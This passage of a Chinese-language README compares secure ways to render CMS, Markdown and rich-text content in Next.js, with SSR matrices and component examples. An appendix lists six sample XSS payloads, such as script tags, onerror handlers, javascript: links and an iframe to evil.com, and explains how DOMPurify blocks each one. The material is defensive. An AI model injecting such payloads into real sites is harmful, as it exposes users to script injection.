> **性能说明**：`generateHTML` 使用 `useMemo` 避免每次渲染时重新计算。JSON → HTML 的转换是确定性的。

---

## 5. SSR 兼容性矩阵

这是 Next.js App Router 的核心考量因素。每种方案在 SSR 下的表现不同：

| 方案 | SSR HTML 输出 | 需要客户端 JS | 兼容 SSG | 需要 'use client' | 说明 |
|------|---------------|--------------|----------|-------------------|------|
| **StructuredRenderer** | ✅ **完全 HTML** — 所有内容在初始负载中 | ❌ 不需要 | ✅ 是 | ❌ 否（服务端组件） | 🥇 **最佳 SSR — 内容立即可见** |
| **MarkdownRenderer** | ✅ **完全 HTML** — 在服务端完全渲染 | ❌ 不需要（react-markdown） | ✅ 是 | ❌ 否（服务端组件） | 🥇 **最佳 SSR — 内容立即可见** |
| **RTERenderer** | ⚠️ **部分 SSR** — 从 JSON 生成 HTML，但需要 'use client' | ✅ 需要（水合） | ✅ 是 | ✅ 是 | 🥈 良好 — 内容在 SSR 中，但需要额外客户端代码 |
| **SanitizedHTMLRenderer** | ❌ **SSR 中没有 HTML** — 渲染 `null`，水合后显示内容 | ✅ 需要（useEffect） | ⚠️ 否（仅客户端） | ✅ 是 | 🥉 **最后手段** — 内容不在 SSR HTML 中 |
| **EmotionRegistry** | ✅ **CSS 在 `<head>` 中** — 完全带样式的 HTML | ⚠️ 少量（水合 + 样式注入） | ✅ 是 | ✅ 是 | 🟢 **安全模式** — 行业标准 |

### SSR 决策流程

```
                    ┌──────────────────────────────────┐
                    │  "内容需要在 SSR HTML 中可见吗?"   │
                    └──────────┬──────────┬───────────┘
                               │          │
                              YES         NO
                               │          │
                    ┌──────────▼─┐  ┌─────▼──────┐
                    │ 数据是     │  │             │
                    │ 结构化的   │  │ 使用         │
                    │ 还是文本?  │  │ Sanitized   │
                    └───┬───┬───┘  │ HTML        │
                        │   │      │ Renderer    │
                 ┌──────▼┐ ┌▼─────┘             │
                 │ JSON  │ │文本  │              │
                 │       │ │      │              │
                 ▼       ▼ ▼      ▼              │
           Structured  Markdown  RTE             │
           Renderer    Renderer  Renderer        │
           🥇          🥇        🥈             │
                                               ▼
                                     DOMPurify (备选)
```

---

## 4. 决策矩阵

| 你的场景 | 推荐方案 | 安全等级 | 实施难度 | SSR 质量 |
|---------|---------|---------|---------|---------|
| 🆕 **新建 CMS 项目** | 方案一：结构化内容 | 🟢 **最高**（完全没有 HTML） | 🟡 中等 | 🟢 **完全 SSR** |
| 📝 **博客/文档系统** | 方案三：Markdown | 🟢 **最高**（安全格式） | 🟢 低 | 🟢 **完全 SSR** |
| ✏️ **富文本编辑器** | 方案四：RTE JSON | 🟢 **最高**（结构化数据） | 🟡 中等 | 🟡 **部分 SSR** |
| ♻️ **迁移遗留 HTML** | 方案二：DOMPurify | 🟡 **良好**（消毒后） | 🟢 低 | 🔴 **无 SSR**（仅客户端） |
| ♻️ **遗留 + 新内容** | 方案二 + 方案一 | 🟢 **最高**（组合） | 🔴 高 | 🟢 **完全 SSR**（迁移后） |
| 🎨 **CSS-in-JS SSR** | 保留现有代码 | 🟢 **安全**（无用户输入） | 🟢 无 | 🟢 **完全 SSR**（样式在 `<head>` 中） |

### 何时组合方案

```
当前状态：数据库中遗留 HTML 内容 ▼
                    │
                    ▼
    ┌───────────────────────────────────┐
    │ 第一阶段：方案二 (DOMPurify)     │  ← 立即部署修复 XSS
    │ "安全第一 — 消毒所有 HTML"        │
    │ 注意：内容在客户端渲染            │  ← ⚠️ SSR 影响
    └───────────────┬───────────────────┘
                    │
                    ▼
    ┌───────────────────────────────────┐
    │ 第二阶段：方案一 (结构化)        │  ← 渐进式迁移
    │ "用 JSON 替换 HTML 块"            │
    │ 注意：内容在 SSR 中渲染           │  ← ✅ SSR 恢复
    └───────────────┬───────────────────┘
                    │
                    ▼
    ┌───────────────────────────────────┐
    │ 第三阶段：淘汰 DOMPurify         │  ← 所有内容迁移完成
    │ "不再有 dangerouslySetInnerHTML"  │
    │ SSR 性能达到最优                  │  ← ✅ 最佳 SSR
    └───────────────────────────────────┘
```

---

## 5. 快速上手

### 5.1 渲染结构化内容（完全 SSR）

```tsx
// app/articles/[slug]/page.tsx（服务端组件 — 没有 'use client'）
import { StructuredRenderer } from '@/components/structured-renderer';

async function getArticle(slug: string) {
  const res = await fetch(`https://cms.example.com/articles/${slug}`);
  return res.json() as Article;
}

export default async function ArticlePage({
  params,
}: {
  params: { slug: string };
}) {
  const article = await getArticle(params.slug);

  return (
    <article>
      <h1>{article.title}</h1>
      {/* ✅ 内容嵌入在 SSR HTML 中 */}
      <StructuredRenderer content={article.body} />
    </article>
  );
}
```

### 5.2 安全渲染用户 HTML（仅客户端，无 SSR）

```tsx
// components/UserComment.tsx
'use client';

import { SanitizedHTMLRenderer } from '@/components/sanitized-html-renderer';

export function UserComment({ html }: { html: string }) {
  return (
    <div className="comment">
      {/* ⚠️ 水合后内容才出现（SSR HTML 中没有） */}
      <SanitizedHTMLRenderer html={html} mode="auto" />
    </div>
  );
}
```

### 5.3 渲染 Markdown（完全 SSR）

```tsx
// components/BlogContent.tsx（服务端组件 — 没有 'use client'）
import { MarkdownRenderer } from '@/components/markdown-renderer';

export function BlogContent({ markdown }: { markdown: string }) {
  return (
    <article className="prose max-w-none">
      {/* ✅ 内容嵌入在 SSR HTML 中 */}
      <MarkdownRenderer content={markdown} />
    </article>
  );
}
```

### 5.4 渲染 RTE JSON（部分 SSR）

```tsx
// components/NewsArticle.tsx（客户端组件 — 需要 'use client'）
'use client';

import { RTERenderer } from '@/components/rte-renderer';

const editorContent = {
  type: 'doc',
  content: [
    {
      type: 'heading',
      attrs: { level: 2 },
      content: [{ type: 'text', text: '突发新闻' }],
    },
  ],
};

export function NewsArticle() {
  return (
    <div className="news-article">
      {/* ⚠️ 需要 'use client'，但内容在 SSR HTML 中 */}
      <RTERenderer content={editorContent} />
    </div>
  );
}
```

---

## 附录：XSS 攻击演示

`/dangerous-html` 页面展示了 6 种常见的 XSS 攻击向量及其处理结果：

| # | 攻击向量 | 示例输入 | DOMPurify 处理结果 | 为什么被拦截 |
|---|---------|---------|-------------------|-------------|
| 1 | **直接脚本注入** | `<script>alert('XSS')</script>` | ❌ 完全删除 | `<script>` 在 FORBID_TAGS 中 |
| 2 | **错误事件攻击** | `<img src="x" onerror="alert('XSS')">` | ❌ 事件删除，`<img>` 保留 | `onerror` 在 FORBID_ATTR 中 |
| 3 | **协议劫持** | `<a href="javascript:alert('XSS')">点击</a>` | ❌ 协议删除 | `javascript:` 被 ALLOWED_URI_REGEXP 阻止 |
| 4 | **内联框架** | `<iframe src="https://evil.com">` | ❌ 完全删除 | `<iframe>` 在 FORBID_TAGS 中 |
| 5 | **鼠标事件** | `<p onmouseover="alert('XSS')">悬停</p>` | ❌ 事件删除，`<p>` 保留 | `onmouseover` 在 FORBID_ATTR 中 |
| 6 | **CSS 注入** | `<style>body{display:none}</style>` | ❌ 完全删除 | `<style>` 在 FORBID_TAGS 中 |

---

## 附录：文件清单

```
src/
├── types/
│   └── content.ts                        # 内容块类型定义和数据接口
├── lib/
│   ├── content-registry.tsx              # 块类型 → 组件映射注册表
│   ├── sanitize-config.ts                # DOMPurify 安全配置（白名单/黑名单）
│   └── sanitize-html.ts                  # DOMPurify 工具（兼容 SSR，延迟加载）
├── components/
│   ├── blocks/
│   │   ├── paragraph-block.tsx           # 段落块组件
│   │   ├── heading-block.tsx             # 标题块组件 (h1-h6)
│   │   ├── image-block.tsx               # 图片块组件（受控属性）
│   │   ├── code-block.tsx                # 代码块组件（语法高亮）
│   │   ├── list-block.tsx                # 列表块组件（有序/无序）
│   │   ├── quote-block.tsx               # 引用块组件
│   │   └── divider-block.tsx             # 水平分割线组件
│   ├── structured-renderer.tsx           # 方案一：结构化内容 → React 组件
│   │                                     #   SSR: ✅ 完全 HTML 在初始负载
│   ├── sanitized-html-renderer.tsx       # 方案二：DOMPurify → dangerouslySetInnerHTML
│   │                                     #   SSR: ❌ 水合后显示内容
│   ├── markdown-renderer.tsx             # 方案三：Markdown → React 组件
│   │                                     #   SSR: ✅ 完全 HTML 在初始负载
│   └── rte-renderer.tsx                  # 方案四：TipTap JSON → React 组件
│                                         #   SSR: ⚠️ 从 JSON 生成 HTML，需要 'use client'
└── app/
    └── dangerous-html/
        └── page.tsx                      # 交互式演示：XSS 攻击和方案对比
```

---

---

## 附录：参考资料

- [OWASP XSS 防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify) — 由 Cure53 开发的安全库
- [React dangerouslySetInnerHTML 文档](https://react.dev/reference/react-dom/components/common#dangerously-set-inner-html)
- [react-markdown GitHub](https://github.com/remarkjs/react-markdown) — 在 React 中渲染 Markdown 的组件
- [rehype-sanitize GitHub](https://github.com/rehypejs/rehype-sanitize) — 在 rehype 中消毒 HTML（搭配 react-markdown 使用）
- [TipTap GitHub](https://github.com/ueberdosis/tiptap) — 富文本编辑器框架（JSON AST 输出）
- [ProseMirror GitHub](https://github.com/ProseMirror/prosemirror) — TipTap 底层引擎（文档模型）
- [Next.js Emotion Registry（官方示例）](https://nextjs.org/docs/app/building-your-application/styling/css-in-js#emotion)
- [Next.js 服务端组件](https://nextjs.org/docs/app/building-your-application/rendering/server-components)
- [isomorphic-dompurify GitHub](https://github.com/kkomelin/isomorphic-dompurify) — SSR 安全的 DOMPurify 包装
- [Next.js CSS-in-JS GitHub 示例](https://github.com/vercel/next.js/tree/canary/examples/with-emotion) — Next.js 官方 Emotion 示例项目
- [Vercel Next.js + Emotion 模板](https://github.com/vercel/next.js/tree/canary/examples/with-emotion) — Vercel 官方的 Emotion SSR 模板
- [Emotion SSR GitHub Issue #2928](https://github.com/emotion-js/emotion/issues/2928) — Emotion 官方 SSR 跟踪 Issue
- [MUI System (sx prop) GitHub](https://github.com/mui/material-ui/tree/master/packages/mui-system) — MUI 的 sx prop 实现（使用 Emotion）
- [styled-components SSR GitHub 示例](https://github.com/vercel/next.js/tree/canary/examples/with-styled-components) — Next.js 官方 styled-components 示例
- [OWASP XSS Filter Evasion 速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) — 高级 XSS 攻击测试模式
